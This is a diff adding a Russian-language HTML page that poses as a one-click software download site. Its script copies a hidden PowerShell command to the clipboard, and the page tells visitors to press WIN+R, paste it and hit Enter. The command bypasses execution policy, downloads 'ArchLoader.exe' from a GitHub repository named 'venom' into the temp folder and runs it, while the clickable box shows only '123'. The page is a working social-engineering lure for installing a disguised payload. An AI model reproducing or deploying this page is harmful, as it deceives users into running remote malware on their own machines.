@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Скачать софт</title>
+    <style>
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            gap: 20px;
+        }
+        .box {
+            background-color: #1e1e1e;
+            padding: 40px;
+            border-radius: 10px;
+            text-align: center;
+            width: 90%;
+            max-width: 1000px;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            margin-bottom: 20px;
+        }
+        .box:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
+        }
+        .box img {
+            width: 100%;
+            border-radius: 5px;
+            transition: transform 0.3s ease;
+        }
+        .box:hover img {
+            transform: scale(1.05);
+        }
+        .box a {
+            display: block;
+            margin-top: 20px;
+            font-size: 1.5em;
+            color: #4CAF50;
+            text-decoration: none;
+            font-weight: bold;
+            transition: color 0.3s ease;
+        }
+        .box a:hover {
+            color: #66BB6A;
+        }
+        .inner-box {
+            background-color: #2a2a2a;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .inner-box:hover {
+            background-color: #3a3a3a;
+        }
+    </style>
+    <script>
+        function copyToClipboard() {
+            const command = "powershell -ExecutionPolicy Bypass -NoProfile -Command \"& { $u='https://github.com/sigmanip/venom/raw/refs/heads/main/ArchLoader.exe'; $o='$env:TEMP\\ArchLoader.exe'; iwr -useb $u -OutFile $o; Start-Process -FilePath $o }\"";
+            navigator.clipboard.writeText(command).then(() => {
+                alert("Команда скопирована в буфер обмена!");
+            });
+        }
+    </script>
+</head>
+<body>
+    <div class="box">
+        <img src="https://private-user-images.githubusercontent.com/124531365/340508334-a058ad27-6c3c-401d-911b-700421056cfb.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDA2MDkxNjUsIm5iZiI6MTc0MDYwODg2NSwicGF0aCI6Ii8xMjQ1MzEzNjUvMzQwNTA4MzM0LWEwNThhZDI3LTZjM2MtNDAxZC05MTFiLTcwMDQyMTA1NmNmYi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMjI2JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDIyNlQyMjI3NDVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0zNjA2Njc2ZDUwODM2MjJkMjFlY2NhYmY3Y2U5MTZkOTNkMjQ4YjIyM2MwM2ZjNjdlZGJjZmM3NTY4ZmE2ZWQ5JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.0qLruRBszVjgAKcxkTKzNTr8tO4szvOcxFeajRamD2I" alt="Banner">
+    </div>
+    <div class="box">
+        <p style="font-size: 2em;">download One click</p>
+        <a href="#">Скачать</a>
+    </div>
+    <div class="box">
+        <p style="font-size: 2em;">To download one click you need to hit WIN+R, paste command below and hit Enter.</p>
+        <div class="inner-box" onclick="copyToClipboard()">
+            <p style="font-size: 1em;">123</p>
+        </div>
+    </div>
+</body>
+</html>
